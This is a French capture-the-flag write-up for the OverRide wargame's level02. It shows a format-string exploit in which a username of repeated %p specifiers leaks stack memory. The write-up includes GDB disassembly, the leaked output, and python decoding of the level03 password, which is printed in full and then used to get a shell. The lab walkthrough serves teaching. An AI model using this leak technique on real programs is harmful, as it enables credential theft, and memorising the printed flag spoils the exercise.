# Level02: FORMAT STRING LIMITED

### Première étape — tester le programme

    $ ./level02 
    ===== [ Secure Access System v1.0 ] =====
    /***************************************\
    | You must login to access this system. |
    \**************************************/
    --[ Username: coucou
    --[ Password: coucou
    *****************************************
    coucou does not have access!

Nous ponvons remarquer que 'Username est print dans le message d'erreur. Regardons sa de plus pres

### Ouvrir GDB

```s
   0x0000000000400814 <+0>:	push   %rbp
   0x0000000000400815 <+1>:	mov    %rsp,%rbp
   0x0000000000400818 <+4>:	sub    $0x120,%rsp
   ......................................................
   # Ici le programme ouvre avec fopen [/home/users/level03/.pass, r]
   0x00000000004008a8 <+148>:	callq  0x400700 <fopen@plt>
   0x00000000004008ad <+153>:	mov    %rax,-0x8(%rbp)
   0x00000000004008b1 <+157>:	cmpq   $0x0,-0x8(%rbp)
   0x00000000004008b6 <+162>:	jne    0x4008e6 <main+210>
   0x00000000004008b8 <+164>:	mov    0x200991(%rip),%rax        # 0x601250 <stderr@@GLIBC_2.2.5>
   # Ici le programme stock le resultat de lecture dans une adresse dans la stack.
   0x0000000000400901 <+237>:	callq  0x400690 <fread@plt>
   0x0000000000400906 <+242>:	mov    %eax,-0xc(%rbp)
   0x0000000000400909 <+245>:	lea    -0xa0(%rbp),%rax
   0x0000000000400910 <+252>:	mov    $0x400bf5,%esi
   # Ici le programme compare si le mot de passe est egal au buffer read.[donc le password de level03]
   0x0000000000400a63 <+591>:	callq  0x400670 <strncmp@plt>
   0x0000000000400a68 <+596>:	test   %eax,%eax
   0x0000000000400a6a <+598>:	jne    0x400a96 <main+642>
   0x0000000000400a6c <+600>:	mov    $0x400d22,%eax
   0x0000000000400a71 <+605>:	lea    -0x70(%rbp),%rdx
   0x0000000000400a75 <+609>:	mov    %rdx,%rsi
   0x0000000000400a78 <+612>:	mov    %rax,%rdi
   0x0000000000400a7b <+615>:	mov    $0x0,%eax
   0x0000000000400a80 <+620>:	callq  0x4006c0 <printf@plt>
   0x0000000000400a85 <+625>:	mov    $0x400d32,%edi
   # Ici si il est egal il ouvre le /bin/sh
   0x0000000000400a8a <+630>:	callq  0x4006b0 <system@plt>
   0x0000000000400a8f <+635>:	mov    $0x0,%eax
   0x0000000000400a94 <+640>:	leaveq 
   0x0000000000400a95 <+641>:	retq   
   0x0000000000400a96 <+642>:	lea    -0x70(%rbp),%rax
   0x0000000000400a9a <+646>:	mov    %rax,%rdi
   0x0000000000400a9d <+649>:	mov    $0x0,%eax
   # Ici si le mot de passe est errone printf affiche le buffer username [expoit Format string Here]
   0x0000000000400aa2 <+654>:	callq  0x4006c0 <printf@plt>
   0x0000000000400aa7 <+659>:	mov    $0x400d3a,%edi
   0x0000000000400aac <+664>:	callq  0x400680 <puts@plt>
   0x0000000000400ab1 <+669>:	mov    $0x1,%edi
   0x0000000000400ab6 <+674>:	callq  0x400710 <exit@plt>
```
- 1ᵉʳ constat : le `password` est stocker dans la **stack**
- 2ᵉᵐᵉ constat : nous avons la posibiliter d'exploit un **format string**
- 3ᵉᵐᵉ constat : le binaire est en 64 bits nous empechant d'ecrire dans le GOT ou DTOR.

> _**REMARQUES:**_ L'exploit format string nous permets de lire dans la stack.

### ASEMBLY TO C

*Clique [**ICI**](./Ressources/main.c) si tu veux voir tous le code en **C***

### OFFSET

==Mais avant de commencer un petit rappel sur le format string et les complications sur des binaire 64bits==

Sur ce niveau malheureusement l'exploit format string est beaucoup plus compliquer sur un systeme **x86_64** malheureusement a cause des ``\x00`` qui sont interpreter par printf comme ``\0`` et qui close la suite du process.

**Exemple format string 32BITS & 64BITS**

```
> test@sben-tay:~$ (python -c 'print "\xfb\xff\x45\xe7"[::-1] %AAAAc%4$n) | ./example_fs.c
> $ before format string : 0xfbff45e7
> $ after format string : 0x41414141
```

```
> test@sben-tay:~$ (python -c 'print "\x00\x00\x00\x00\xfb\xff\x45\xe7"[::-1] %AAAAc%4$n) | ./example_fs.c
> $ before format string : 0x0000fbff45e7
> $ after format string : 0x0000fbff45e7
```

> _**INFO:**_ les nulbytes est un probleme classique dans les shellcodes.

Nous savons deja que le flag est stocker dans une variable de la stack tous ce que nous avons a faire c'est d'afficher toutes les adresse de la stack avec printf !

```bash
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p%.p
--[ Password: *****************************************
0x7fffffffe500(nil)0x250x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6f80x1f7ff9a080x2e25702e25702e250x25702e25702e25700x702e25702e25702e0x2e25702e25702e250x25702e25702e25700x702e25702e25702e0x2e25702e25702e250x70(nil)(nil)(nil)(nil)0x100000000(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d0xfeff000x2e25702e25702e250x25702e25702e25700x702e25702e25702e0x2e25702e25702e250x25702e25702e25700x702e25702e25702e does not have access!
```
> _**Remarque:**_ Une string fini toujours pas NULL.

Ces lignes sont interressante elle semble contenir des characteres **ascii** ! Regardons ce qui y'a a l'interieur
``(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d``

### HEX TO STRING

Maintenant que nous avons des adresses suceptible d'avoir notre password regardons ce qu'elles contiennent !

```
python
>>> import codecs
>>> codecs.decode("756e505234376848", 'hex')[::-1]
'Hh74RPnu'
...
```
- 0x756e505234376848 = 'Hh74RPnu'
- 0x45414a3561733951 = 'Q9sa5JAE'
- 0x377a7143574e6758 = XgNWCqz7
- 0x354a35686e475873 = 'sXGnh5J5'
- 0x48336750664b394d = 'M9KfPg3H'

> _**password_joined:**_ Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H


### EXEC

```bash
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: anything
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, anything!
$ whoami
level03
```
> Comme dit plus haut le password etait le pass du level superieur. donc nous avons notre flag ! 

**CONGRATULATIONS — you owned it ! 🎉**